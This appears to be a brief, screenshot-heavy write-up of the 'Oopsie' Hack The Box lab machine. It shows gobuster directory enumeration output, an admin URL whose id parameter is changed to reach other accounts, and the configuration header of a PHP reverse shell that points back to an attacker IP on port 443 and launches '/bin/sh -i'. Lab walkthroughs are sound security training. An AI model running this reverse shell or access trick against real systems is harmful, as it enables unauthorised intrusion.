# Oopsie
_______

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/f3b6eb49-52df-4aee-8fba-42110bd94ccf)


#### Directory Enumeration
```
┌──(melle㉿tuguldur)-[~/Downloads]
└─$ gobuster dir  -u http://10.129.2.130/cdn-cgi -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.2.130/cdn-cgi
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
Progress: 123 / 4615 (2.67%)[ERROR] Get "http://10.129.2.130/cdn-cgi/~http": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 124 / 4615 (2.69%)[ERROR] Get "http://10.129.2.130/cdn-cgi/~httpd": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 125 / 4615 (2.71%)[ERROR] Get "http://10.129.2.130/cdn-cgi/~mail": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/~root": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/~operator": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/~nobody": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/~lp": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/~logs": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/~log": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 134 / 4615 (2.90%)[ERROR] Get "http://10.129.2.130/cdn-cgi/~sys": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 813 / 4615 (17.62%)[ERROR] Get "http://10.129.2.130/cdn-cgi/certified": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/certsrv": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/certs": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/cfc": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/cf": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/certserver": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/cfcache": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/cfdocs": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/cfg": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 822 / 4615 (17.81%)[ERROR] Get "http://10.129.2.130/cdn-cgi/cfide": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 1556 / 4615 (33.72%)[ERROR] Get "http://10.129.2.130/cdn-cgi/externalization": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/externalid": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/extra": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 2153 / 4615 (46.65%)[ERROR] Get "http://10.129.2.130/cdn-cgi/javascript": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/java-plugin": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/javascripts": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/javax": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/java-sys": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/jboss": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/jbossas": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/jdbc": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/login                (Status: 301) [Size: 320] [--> http://10.129.2.130/cdn-cgi/login/]
Progress: 2828 / 4615 (61.28%)[ERROR] Get "http://10.129.2.130/cdn-cgi/owners": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/ows": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/ows-bin": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/p": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/P": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/p2p": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/p7pm": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/pa": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/pack": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/package": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 3280 / 4615 (71.07%)[ERROR] Get "http://10.129.2.130/cdn-cgi/rarticles": dial tcp 10.129.2.130:80: i/o timeout (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/rate": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 4489 / 4615 (97.27%)[ERROR] Get "http://10.129.2.130/cdn-cgi/world": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/worldwide": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 4492 / 4615 (97.33%)[ERROR] Get "http://10.129.2.130/cdn-cgi/wp-atom": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/wpau-backup": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/wow": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/wp-admin": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/wp-app": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://10.129.2.130/cdn-cgi/wp": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 4498 / 4615 (97.46%)[ERROR] Get "http://10.129.2.130/cdn-cgi/wp-blog-header": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/ffc0bd9e-f4ec-48d5-a038-9672f77242e1)




![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/1438eeb0-552b-4305-bd35-0bbde379eef4)


![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/8548774d-fbf0-4cab-b08f-27c33d3872d1)

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/88c61aaa-4284-4f66-87db-60edc301a9cf)

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/770a3558-9ece-4804-9d0b-0c8698571fdf)


` 10.129.95.191/cdn-cgi/login/admin.php?content=accounts&id=1`

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/1dbbccd0-a72f-4ac0-8424-f9f856b2b5cb)

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/11ff3aef-62d9-4cf3-9574-be4b19581a06)

php_reverse_shell

```set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.16.153';  // CHANGE THIS
$port = 443;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

```

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/4a3422ca-b1a5-48a1-a30e-c9c0c999a093)

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/f71b9185-b6c0-4a98-b03b-28ff88dac460)

```
$ su robert
su: must be run from a terminal
```

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/0e4b1a57-cd6b-4198-bacb-030fbf1a1b29)

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/fa2b3ed2-2952-40e3-b2cd-7e4006e1b531)


![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/fea96485-810b-412a-b0a8-f6fa741eba77)















